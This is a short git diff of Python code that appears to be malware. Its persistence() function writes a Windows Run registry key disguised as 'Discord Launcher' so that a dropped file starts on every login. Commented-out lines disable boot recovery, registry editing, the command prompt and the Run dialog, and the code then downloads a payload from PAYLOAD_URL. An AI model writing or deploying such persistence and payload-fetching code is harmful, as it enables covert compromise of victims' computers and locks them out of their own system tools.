@@ -5,7 +5,7 @@ from modules.constants import MY_HOME, PAYLOAD_URL, PAYLOAD_NAME
 
 
 def persistence(home, file_name):
-    # try:
+    try:
     #     os.system('bcdedit /set {default} recoveryenabled No')
     #     os.system('bcdedit /set {default} bootstatuspolicy ignoreallfailures')
     #     os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableRegistryTools /d 1 /f')
@@ -14,16 +14,10 @@ def persistence(home, file_name):
     #         'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableCMD /d 1 /f')
     #     os.system(
     #         'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRun /d 1 /f')
-    # except:
-    #     pass
-
-    try:
         os.system(
             f'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v "Discord Launcher" /d {home+file_name} /f')
-
     except:
         pass
-
 
 try:
     r = requests.get(PAYLOAD_URL, allow_redirects=True)
